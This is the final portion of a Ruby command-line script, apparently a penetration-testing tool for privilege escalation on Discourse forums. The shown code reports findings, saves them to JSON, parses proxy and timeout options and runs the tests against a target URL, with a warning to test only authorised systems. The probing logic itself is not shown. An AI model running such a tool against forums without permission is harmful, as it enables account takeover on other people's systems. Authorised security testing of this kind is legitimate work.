      @results[:vulnerabilities].each_with_index do |vuln, index|
        puts "  #{index + 1}. #{vuln[:severity]} - #{vuln[:endpoint]} (#{vuln[:test_type]})"
        puts "     Method: #{vuln[:method]}"
        puts "     Evidence: #{vuln[:evidence].join(', ')}" if vuln[:evidence].any?
      end
    end
  end
  
  def save_results
    filename = 'discourse_privilege_escalation_results.json'
    File.write(filename, JSON.pretty_generate(@results))
    puts "\n[*] Results saved to #{filename}"
  end
end

# Main execution
if __FILE__ == $0
  require 'optparse'
  
  options = {}
  OptionParser.new do |opts|
    opts.banner = "Discourse Privilege Escalation Test Suite\n\n"
    opts.banner += "Usage: ruby discourse_privilege_escalation.rb [options] TARGET_URL\n\n"
    
    opts.on('--proxy PROXY', 'Proxy URL (e.g., http://127.0.0.1:8080)') do |proxy|
      options[:proxy] = proxy
    end
    
    opts.on('--timeout TIMEOUT', Integer, 'Request timeout (default: 10)') do |timeout|
      options[:timeout] = timeout
    end
    
    opts.on('-h', '--help', 'Show this help') do
      puts opts
      puts "\nExample:"
      puts "  ruby discourse_privilege_escalation.rb https://discourse.example.com"
      puts "\nWARNING: Use only on systems you own or have explicit permission to test!"
      exit
    end
  end.parse!
  
  if ARGV.empty?
    puts "Error: Target URL required"
    puts "Use --help for usage information"
    exit 1
  end
  
  target_url = ARGV[0]
  
  begin
    exploit = DiscoursePrivilegeEscalation.new(target_url, options)
    results = exploit.run_all_tests
    
    if results[:vulnerable]
      puts "\nüö® CRITICAL: Privilege escalation vulnerabilities found!"
      puts "   Unauthorized privilege escalation possible!"
    else
      puts "\n‚úÖ No privilege escalation vulnerabilities detected"
    end
    
  rescue Interrupt
    puts "\n[!] Testing interrupted by user"
  rescue => e
    puts "\n[!] Testing failed: #{e.message}"
  end
end